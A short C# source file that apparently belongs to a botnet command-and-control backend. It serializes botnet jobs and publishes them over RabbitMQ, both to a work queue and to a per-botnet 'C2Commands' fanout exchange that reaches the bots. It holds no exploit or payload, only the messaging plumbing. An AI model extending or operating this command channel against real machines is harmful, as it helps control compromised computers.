using System.Text;
using BotnetJobs.Domain.Entities;
using BotnetJobs.Messaging.Send.Options.v1;
using Microsoft.Extensions.Options;
using Newtonsoft.Json;
using RabbitMQ.Client;

namespace BotnetJobs.Messaging.Send.Sender.v1
{
    public class BotnetJobUpdateSender : IBotnetJobUpdateSender
    {
        private readonly string _hostname;
        private readonly string _queueName;
        private readonly string _userName;
        private readonly string _password;

        public BotnetJobUpdateSender(IOptions<RabbitMqConfiguration> rabbitMqOptions)
        {
            _hostname = rabbitMqOptions.Value.Hostname;
            _queueName = rabbitMqOptions.Value.QueueName;
            _userName = rabbitMqOptions.Value.UserName;
            _password = rabbitMqOptions.Value.Password;
        }

        public void SendBotnetJob(BotnetJob botnetJob)
        {
            var factory = new ConnectionFactory() { HostName = _hostname, UserName = _userName, Password = _password };

            using var connection = factory.CreateConnection();
            using var channel = connection.CreateModel();

            channel.QueueDeclare(queue: _queueName, durable: false, exclusive: false, autoDelete: false, arguments: null);
            var json = JsonConvert.SerializeObject(botnetJob);
            var body = Encoding.UTF8.GetBytes(json);

            channel.BasicPublish(exchange: "", routingKey: _queueName, basicProperties: null, body: body);

            using var botsChannel = connection.CreateModel();
            botsChannel.ExchangeDeclare(exchange: "C2Commands" + botnetJob.BotnetId.ToString(), type: "fanout");
            botsChannel.BasicPublish(exchange: "C2Commands" + botnetJob.BotnetId.ToString(), routingKey: "",
                body: body);
        }
    }
}
